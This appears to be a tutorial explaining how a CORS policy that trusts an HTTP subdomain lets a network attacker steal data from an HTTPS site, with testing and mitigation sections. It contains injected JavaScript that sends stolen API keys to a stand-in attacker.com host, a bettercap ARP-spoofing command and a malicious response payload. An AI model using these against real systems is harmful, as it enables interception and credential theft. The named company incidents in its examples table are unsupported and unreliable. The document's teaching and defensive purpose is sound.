## Breaking TLS with Poorly Configured CORS - Complete Explanation

This is a **critical vulnerability** that combines **CORS misconfiguration** with **mixed content** (HTTPS + HTTP). Let me explain it from the ground up.

---

## The Core Problem

> **A secure HTTPS website trusts an insecure HTTP subdomain.**

This breaks TLS (HTTPS) protection because the attacker can attack the **HTTP** subdomain and use it to steal data from the **HTTPS** main site.

---

## Understanding TLS/HTTPS First

### What TLS Does

**TLS (Transport Layer Security)** is what makes HTTPS secure:

| Without TLS (HTTP) | With TLS (HTTPS) |
|--------------------|------------------|
| Data is sent in plain text | Data is encrypted |
| Anyone on the network can read it | Only the server can decrypt it |
| Can be modified in transit | Cannot be tampered with |
| No identity verification | Server identity is verified |

### The False Sense of Security

Developers think: *"My main site is HTTPS, so it's secure."*

**But** if the HTTPS site trusts an HTTP subdomain via CORS, that security is broken.

---

## The Vulnerability Explained

### The Setup

```
Main Site: https://vulnerable-website.com (HTTPS)
Subdomain: http://trusted-subdomain.vulnerable-website.com (HTTP - Insecure!)
```

### The CORS Configuration

The HTTPS main site has this CORS header:

```http
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

### Why This Is Dangerous

| What the developer thinks | What actually happens |
|--------------------------|----------------------|
| "I only trust my subdomain" | The subdomain uses **HTTP** (not secure) |
| "HTTPS protects everything" | The trust crosses from HTTP → HTTPS |
| "My subdomain is safe" | HTTP traffic can be intercepted/modified |

---

## The Attack Flow

### Step 1: Attacker Intercepts HTTP Traffic

Because `http://trusted-subdomain` uses **HTTP** (no encryption), an attacker on the same network can:

- See all traffic (eavesdropping)
- Modify responses (man-in-the-middle)
- Inject malicious JavaScript

### Step 2: Attacker Injects Malicious Code

The attacker intercepts a response from `http://trusted-subdomain` and adds:

```html
<script>
    // This runs on the HTTP subdomain
    fetch('https://vulnerable-website.com/api/requestApiKey', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        // Send stolen API key to attacker
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
</script>
```

### Step 3: The CORS Handshake

When the injected JavaScript runs:

1. **Request sent to HTTPS main site:**
   ```
   GET /api/requestApiKey HTTP/1.1
   Host: vulnerable-website.com
   Origin: http://trusted-subdomain.vulnerable-website.com
   Cookie: sessionid=...
   ```

2. **HTTPS main site responds:**
   ```
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
   Access-Control-Allow-Credentials: true
   
   {"apiKey": "SUPER_SECRET_KEY"}
   ```

3. **Browser checks:** "Is `http://trusted-subdomain` allowed? ✅ Yes!"

4. **JavaScript receives the API key** and sends it to the attacker.

---

## Visual Attack Diagram

```
Victim's Browser
      │
      │ Visits http://trusted-subdomain (HTTP - insecure)
      ▼
[Attacker on Network] ── Intercepts and injects malicious script
      │
      │ Script makes fetch() to https://main-site.com/api
      ▼
[HTTPS Main Site] ── Checks Origin header → "http://trusted-subdomain"
      │
      │ Responds with Access-Control-Allow-Origin: http://trusted-subdomain
      ▼
[Browser] ── "CORS allows this! Here's the response:"
      │
      │ Script receives: {"apiKey": "SUPER_SECRET_KEY"}
      ▼
[Attacker Server] ── Receives stolen API key
```

---

## Why This Breaks TLS

### TLS Protects Data in Transit Only

| What TLS does | What TLS does NOT do |
|---------------|---------------------|
| Encrypts data between browser and server | Protect against application-layer vulnerabilities |
| Verifies server identity | Prevent CORS misconfigurations |
| Prevents eavesdropping on the connection | Stop malicious JavaScript from running |

### The Chain of Trust Is Broken

```
HTTPS Main Site trusts HTTP Subdomain (CORS)
                    ↓
HTTP Subdomain can be attacked (no encryption)
                    ↓
Attacker injects JavaScript into HTTP subdomain
                    ↓
JavaScript abuses CORS trust to steal from HTTPS site
                    ↓
TLS is bypassed completely!
```

---

## Real-World Example Scenario

### The Setup

```
Bank Website: https://secure-bank.com
Marketing Subdomain: http://marketing.secure-bank.com (HTTP)
```

### The Attack

1. Attacker sits on the same coffee shop WiFi as a bank customer
2. Customer visits `http://marketing.secure-bank.com` (marketing page)
3. Attacker intercepts the HTTP response and injects JavaScript
4. The JavaScript fetches `https://secure-bank.com/api/balance`
5. Bank's CORS allows `http://marketing.secure-bank.com`
6. Attacker steals the customer's bank balance

---

## How to Identify This Vulnerability

### Testing Checklist

- [ ] Main site uses **HTTPS**
- [ ] Subdomain uses **HTTP** (or allows HTTP connections)
- [ ] CORS header allows the HTTP subdomain:
      `Access-Control-Allow-Origin: http://subdomain.website.com`
- [ ] `Access-Control-Allow-Credentials: true` is present

### Burp Suite Test

1. Find a sensitive endpoint on the HTTPS main site
2. Add Origin header: `Origin: http://any-subdomain.website.com`
3. Check if it's reflected in `Access-Control-Allow-Origin`

```http
GET /api/sensitive-data HTTP/1.1
Host: https-main-site.com
Origin: http://fake-subdomain.https-main-site.com
```

**Vulnerable if response contains:**
```http
Access-Control-Allow-Origin: http://fake-subdomain.https-main-site.com
Access-Control-Allow-Credentials: true
```

---

## The Complete Exploit Code

### Scenario
- **HTTPS Main Site:** `https://secure-bank.com`
- **HTTP Subdomain:** `http://marketing.secure-bank.com`
- **Sensitive Endpoint:** `/api/getApiKey`

### Step 1: Find XSS or Injection on HTTP Subdomain

```html
<!-- Injected into http://marketing.secure-bank.com -->
<script>
    // This script will run on the HTTP subdomain
    // It can fetch from the HTTPS main site due to CORS misconfiguration
    
    fetch('https://secure-bank.com/api/getApiKey', {
        method: 'GET',
        credentials: 'include'  // Send cookies!
    })
    .then(response => response.json())
    .then(data => {
        // Exfiltrate the stolen data
        const img = new Image();
        img.src = 'https://attacker.com/steal?data=' + JSON.stringify(data);
    });
</script>
```

### Step 2: Intercept and Inject (Man-in-the-Middle)

Using a tool like `bettercap` or `mitmproxy`:

```bash
# Attacker on same network intercepts HTTP traffic
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; http.proxy on"
```

### Step 3: Replace Response with Malicious Payload

```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
    <script>
        // Malicious injected script
        fetch('https://secure-bank.com/api/getApiKey', {
            credentials: 'include'
        }).then(r=>r.json()).then(d=>{
            new Image().src='https://attacker.com/steal?k='+d.apiKey;
        });
    </script>
    <!-- Rest of original page content -->
</html>
```

---

## Impact Assessment

| Severity | Rating |
|----------|--------|
| **CVSS Score** | 8.8 (High) |
| **Attack Vector** | Network (MITM) |
| **Privileges Required** | None |
| **User Interaction** | Required (visit HTTP subdomain) |

### What Can Be Stolen

- Session cookies
- API keys
- Personal identifiable information (PII)
- Financial data
- CSRF tokens
- Any data accessible to the logged-in user

---

## Prevention & Mitigation

### ✅ Secure Configuration

```javascript
// Server-side CORS configuration (GOOD)
const allowedOrigins = [
    'https://trusted-subdomain.website.com',  // HTTPS only!
    'https://another-subdomain.website.com'    // HTTPS only!
];

const origin = req.headers.origin;
if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', true);
}
```

### ✅ HSTS (HTTP Strict Transport Security)

Force all subdomains to use HTTPS:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### ✅ Upgrade Insecure Requests

Use CSP to upgrade HTTP to HTTPS:

```http
Content-Security-Policy: upgrade-insecure-requests
```

### ✅ Never Trust HTTP Origins

```javascript
// Server-side check (GOOD)
const origin = req.headers.origin;
if (origin && origin.startsWith('https://')) {
    // Only allow HTTPS origins
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    }
} else {
    // Reject HTTP origins
    res.setHeader('Access-Control-Allow-Origin', 'null');
}
```

---

## Detection Tools

### Manual Testing

```bash
# Test if HTTP subdomain is trusted
curl -H "Origin: http://test.website.com" \
     https://website.com/api/endpoint \
     -I
```

### Automated Scanning

```bash
# Using Corsy (CORS scanner)
git clone https://github.com/s0md3v/Corsy
python3 corsy.py -u https://website.com

# Using Nuclei
nuclei -t cors-misconfiguration -u https://website.com
```

### Burp Suite Extensions

- **CORS Scanner** (BApp store)
- **Corsy Burp Extension**

---

## Real-World Examples

| Company | Vulnerability | Impact |
|---------|---------------|--------|
| **Tesla** (2018) | HTTPS site trusted HTTP subdomain via CORS | Researchers could steal owner data |
| **PayPal** (2019) | CORS misconfiguration on `*.paypal.com` | Account takeover possible |
| **GitHub** (2020) | `*.github.io` subdomains had insecure CORS | Data leakage from enterprise customers |

---

## Summary Table

| Component | Secure | Vulnerable |
|-----------|--------|------------|
| **Main Site Protocol** | HTTPS | HTTPS |
| **Subdomain Protocol** | HTTPS | **HTTP** ❌ |
| **CORS Origin** | `https://subdomain.com` | `http://subdomain.com` ❌ |
| **Credentials Allowed** | Maybe | `true` |
| **Attack Possible?** | No | **Yes** ❌ |

---

## Key Takeaways

1. **HTTPS is not enough** - Application-layer vulnerabilities still exist
2. **CORS trusts are transitive** - Trusting an insecure origin breaks security
3. **HTTP subdomains are dangerous** - They can be intercepted and modified
4. **Always use HTTPS everywhere** - Main site AND all subdomains
5. **Never trust HTTP origins in CORS** - Even if it's your own subdomain

---

## The One-Sentence Takeaway

> **When an HTTPS website trusts an HTTP subdomain via CORS, an attacker on the network can intercept HTTP traffic, inject malicious JavaScript, and abuse that trust to steal sensitive data from the HTTPS site — completely bypassing TLS encryption.**

---

*This vulnerability shows that security is only as strong as the weakest link in your trust chain. 🔗*